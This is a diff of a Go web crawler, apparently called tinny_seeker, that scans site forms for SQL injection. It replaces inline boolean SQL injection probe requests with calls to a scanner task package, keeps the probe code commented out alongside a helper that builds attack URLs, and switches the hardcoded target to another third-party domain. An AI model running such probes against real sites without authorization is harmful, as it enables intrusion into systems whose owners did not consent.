@@ -1,8 +1,8 @@
 package main
 
 import (
+	"bytes"
 	"fmt"
-	"net/http"
 	"strings"
 
 	"github.com/PuerkitoBio/goquery"
@@ -12,6 +12,7 @@ import (
 	"github.com/hu17889/go_spider/core/scheduler"
 	"github.com/hu17889/go_spider/core/spider"
 	"github.com/mkideal/cli"
+	"github.com/scbizu/tinny_seeker/scanner"
 )
 
 type argT struct {
@@ -24,22 +25,22 @@ type argT struct {
 //crawl layer
 var layer int
 var urls []string
-var domain = "dirtytao.com"
-var targetURL = "http://www.dirtytao.com/"
+var domain = "nxzx.net"
+var targetURL = "http://www.nxzx.net/"
 
 //  seeker  --la 	 default is OFF
 var localFlag bool
 
-//Processor
+//SeekerProcessor Construction
 type SeekerProcessor struct {
 }
 
-//Construct function
+//NewSeeker returns a Processor
 func NewSeeker() *SeekerProcessor {
 	return &SeekerProcessor{}
 }
 
-//Process
+//Process is used to analyse the whole HTML
 func (object *SeekerProcessor) Process(p *page.Page) {
 
 	if !p.IsSucc() {
@@ -50,76 +51,140 @@ func (object *SeekerProcessor) Process(p *page.Page) {
 	//CASE:<a href="" />
 	query.Find("a").Each(func(i int, s *goquery.Selection) {
 		value, _ := s.Attr("href")
-		//	name := s.Text()
+		// name := s.Text()
 		urls = append(urls, value)
-		// req := p.GetRequest()
-		//p.AddField(name, value)
 
-		// p.AddField(value, req.GetMethod())
+		// p.AddField(name, value)
+
 	})
 	//CASE:<form action=""></form>
 	query.Find("form").Each(func(i int, s *goquery.Selection) {
 
 		value, _ := s.Attr("action")
-		value = AutofillUrl(targetURL, value)
+		value = AutofillURL(targetURL, value)
 
-		method, _ := s.Attr("method")
-		if method == "get" {
-			//	name:=s.Children().Children().Attr("name")
-			resp, err := http.Get(value + "?s=4%'and 1=2 and '%' ='")
-			resp1, err := http.Get(value + "?s=4%'and 1=1 and '%' ='")
-			if err != nil {
-				color.Red("%s", err)
-			}
-			if resp.StatusCode == 200 && resp1.StatusCode == 200 {
-				p.AddField(value, "searchbar SQL injection test pass!")
-			} else {
-				p.AddField(value, resp.Status+"\t"+resp1.Status)
-			}
+		//TODO:sqlmap insert here
+
+		taskerid, err := scanner.NewTasker()
+		if err != nil {
+			color.Red("%s", err)
 		}
+
+		isStart, err := scanner.StartTasker(taskerid, value)
+		if err != nil {
+			color.Red("%s", err)
+		}
+
+		if isStart {
+			color.Green("一个新的Tasker开启了....")
+		}
+
+		Res, err := scanner.GetResultFromTasker(taskerid)
+		if err != nil {
+			color.Red("%s", err)
+		}
+		if len(Res) > 0 {
+			for _, v := range Res {
+				color.Green(v + " ")
+			}
+		} else {
+			color.Cyan("并没有什么卵的漏洞....")
+		}
+
+		// method, _ := s.Attr("method")
+		// // NOTE: SQL injection here
+		// if method == "get" {
+		// 	params := GetChildsWithTag("input", s)
+		// 	AttackParams := "4%'and 1=2 and '%' ='"
+		// 	ATKURL := GenerateATKURL(AttackParams, params)
+		// 	color.Green(value + ATKURL)
+		// 	//REQUEST
+		// 	resp, err := http.Get(value + ATKURL)
+		// 	resp1, err := http.Get(value + ATKURL)
+		// 	if err != nil {
+		// 		color.Red("%s", err)
+		// 	}
+		// 	if resp.StatusCode == 200 && resp1.StatusCode == 200 {
+		// 		p.AddField(value+ATKURL, ": searchbar SQL injection test pass!")
+		// 	} else {
+		// 		p.AddField(value+ATKURL, resp.Status+"\t"+resp1.Status)
+		// 	}
+		// }
+		//add form object to scheduler
+		urls = append(urls, value)
 	})
 
 	//过滤URLS
-	var filteredUrl []string
+	var filteredURL []string
 	//add urls to scheduler
 
 	if localFlag {
 		//only crawl the local domain
 		for i := 0; i < len(urls); i++ {
-			urls[i] = AutofillUrl(targetURL, urls[i])
+			urls[i] = AutofillURL(targetURL, urls[i])
 			if strings.Contains(urls[i], domain) && !strings.Contains(urls[i], "javascript") {
-				filteredUrl = append(filteredUrl, urls[i])
+				filteredURL = append(filteredURL, urls[i])
 				// color.Red("%s", urls[i])
 			}
 		}
 		//	p.AddTargetRequests(filteredUrl, "html")
 	} else {
 		for i := 0; i < len(urls); i++ {
-			urls[i] = AutofillUrl(targetURL, urls[i])
+			urls[i] = AutofillURL(targetURL, urls[i])
 			if !strings.Contains(urls[i], "javascript") {
-				filteredUrl = append(filteredUrl, urls[i])
+				filteredURL = append(filteredURL, urls[i])
 			}
 		}
 		//	p.AddTargetRequests(filteredUrl, "html")
 	}
 
 	if layer-1 > 0 {
-		p.AddTargetRequests(filteredUrl, "html")
+		p.AddTargetRequests(filteredURL, "html")
 		layer--
 	}
 
 }
 
+//Finish  will be called in the end
 func (object *SeekerProcessor) Finish() {
 	color.Yellow("store data to the db...")
 }
 
-//design for the need that change relative path to absolute path
-func AutofillUrl(targetUrl string, originUrl string) string {
-	if !strings.Contains(originUrl, "http") {
-		originUrl = targetUrl + originUrl
+//AutofillURL is designed for the need that change relative path to absolute path
+func AutofillURL(targetURL string, originURL string) string {
+	if !strings.Contains(originURL, "http") {
+		originURL = targetURL + originURL
 	}
-	return originUrl
+	return originURL
+}
+
+//GetChildsWithTag Get Children tag with specific name
+func GetChildsWithTag(tagname string, s *goquery.Selection) []string {
+	var tags []string
+	//Children numbers
+
+	s.Find(tagname).Each(func(i int, child *goquery.Selection) {
+		len := child.Children().Length()
+		tag, _ := child.Attr("name")
+		tags = append(tags, tag)
+		if len != 0 {
+			GetChildsWithTag(tagname, child.Children())
+		}
+	})
+
+	return tags
+}
+
+//GenerateATKURL generate the  ATK request URL(temp)
+//TODO:need FIX
+func GenerateATKURL(ATKdata string, urlparams []string) string {
+	var buf bytes.Buffer
+	buf.WriteString("?" + urlparams[0] + "=" + ATKdata)
+	for i := 1; i < len(urlparams); i++ {
+		buf.WriteString("&")
+		buf.WriteString(urlparams[i] + "=" + ATKdata)
+	}
+	return buf.String()
 }
 
 func main() {
@@ -136,15 +201,14 @@ func main() {
 		localFlag = argv.Zone
 
 		// layer = argv.Layer
-		pageItems := sp.SetThreadnum(2).SetScheduler(scheduler.NewQueueScheduler(true)).SetSleepTime("rand", 800, 1500).GetByRequest(req)
-		//	sp.SetThreadnum(4).SetScheduler(scheduler.NewQueueScheduler(true)).AddPipeline(pipeline.NewPipelineConsole()).Run()
-		// color.Red("%d", layer)
+		pageItems := sp.SetThreadnum(2).SetScheduler(scheduler.NewQueueScheduler(true)).SetSleepTime("rand", 1500, 3500).GetByRequest(req)
+		// sp.SetThreadnum(4).SetScheduler(scheduler.NewQueueScheduler(true)).AddPipeline(pipeline.NewPipelineConsole()).Run()
+		//	color.Red("%d", layer)
 
 		fmt.Println("-----------------------------------Result---------------------------------")
 		for name, value := range pageItems.GetAll() {
 			color.Green(name + ":" + value + "\n")
 		}
-
 		return nil
 	}, "cli for the tinny_seeker")
 }
